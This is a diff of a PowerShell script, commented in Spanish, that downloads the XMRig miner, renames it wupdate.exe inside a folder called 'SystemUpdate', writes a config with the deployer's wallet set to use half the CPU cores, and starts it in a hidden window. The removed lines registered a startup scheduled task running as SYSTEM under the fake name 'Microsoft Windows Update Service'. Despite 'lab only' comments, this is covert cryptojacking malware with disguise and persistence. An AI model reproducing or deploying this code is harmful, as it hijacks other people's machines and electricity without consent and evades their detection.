@@ -1,21 +1,19 @@
-# === DEPLOY XMRig MINERO - Silencioso + Persistente (Versión corregida - Lab only) ===
+# === DEPLOY XMRig MINERO - Versión 4 (Simple y fiable para lab) ===
 $installPath = "C:\ProgramData\SystemUpdate"
 New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 
-# Descarga y descomprime XMRig v6.25.0
+# Descarga y extrae XMRig
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
 $zipPath = "$installPath\xmrig.zip"
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
 Remove-Item $zipPath -Force
 
-# Ruta correcta: el ejecutable está dentro de la subcarpeta xmrig-6.25.0
+# Copiar y renombrar el ejecutable
 $xmrigExe = "$installPath\xmrig-6.25.0\xmrig.exe"
-
-# Stealth: copiamos y renombramos a wupdate.exe en la raíz
 Copy-Item $xmrigExe "$installPath\wupdate.exe" -Force
 
-# Configuración con tu wallet + 50% núcleos
+# Config con tu wallet + 50% núcleos
 $configContent = @'
 {
     "autosave": true,
@@ -38,19 +36,8 @@ $configContent = @'
 $configPath = "$installPath\config.json"
 $configContent | Out-File -FilePath $configPath -Encoding utf8 -Force
 
-# Persistencia: tarea programada como SYSTEM (invisible)
-$taskName = "Microsoft Windows Update Service"
+# === EJECUCIÓN DIRECTA (sin tarea) ===
 $exePath = "$installPath\wupdate.exe"
+Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -ArgumentList @("-NoProfile", "-WindowStyle", "Hidden", "-Command", "& '$exePath' -c '$configPath'")
-
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
-
-# Ejecutar inmediatamente sin ventana
-Start-Process powershell.exe -ArgumentList @("-NoProfile", "-WindowStyle", "Hidden", "-Command", "& '$exePath' -c '$configPath'") -WindowStyle Hidden
-
-Write-Output "=== Minero desplegado y persistente correctamente (versión corregida) ==="
+Write-Output "=== Minero lanzado directamente (versión 4) ==="
